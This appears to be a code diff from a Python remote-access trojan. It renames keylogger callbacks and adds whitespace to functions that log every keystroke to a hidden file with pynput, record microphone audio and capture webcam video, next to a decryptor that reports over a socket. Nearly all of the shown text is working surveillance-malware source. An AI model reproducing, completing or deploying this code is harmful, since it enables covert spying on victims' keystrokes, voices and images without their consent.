@@ -108,7 +108,7 @@ def decryptor():
         Err="Decryption was unsuccessful"
         s.send(Err.encode())
 def keylog(): 
-    def process_key_press(key):
+    def key_press(key):
             try:
                 current_key = '{0} pressed'.format(key)
             
@@ -118,14 +118,14 @@ def keylog():
                     f.write(str(key)+".pressed'..'")
             except AttributeError:
                     f.write('>uk<')
-    def process_key_press2(key):
+    def key_release(key):
             try:
                 current_key = '{0} pressed'.format(key)       
                 with open("__.txt","a+") as f:
                     f.write(str(key)+".released'..'")
             except AttributeError:
                 f.write("<uk>")
-    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press , on_release=process_key_press2)
+    keyboard_listener = pynput.keyboard.Listener(on_press=key_press , on_release=key_release)
     with keyboard_listener: 
         keyboard_listener.join()
 
@@ -252,6 +252,9 @@ def audcap():
 
             p.terminate()
 
+
+
+
             wf = wave.open(filename, 'wb')
             wf.setnchannels(channels)
             wf.setsampwidth(p.get_sample_size(sample_format))
@@ -286,13 +289,20 @@ def vidcap():
             cap = cv2.VideoCapture(0)
             x= cap.get(cv2.CAP_PROP_FRAME_WIDTH);
             y = cap.get(cv2.CAP_PROP_FRAME_HEIGHT);
+
+
             fourcc = cv2.VideoWriter_fourcc(*'DIVX')
             out = cv2.VideoWriter('_.mp4',fourcc,20.0,(int(x),int(y)))
             begin_time=time.time()
             while(int(time.time() - begin_time) < capture_time ):
                 ret, frame = cap.read()
                 if ret==True:
+
+
+
                     out.write(frame)
+            
+
                 else:
                     break
 
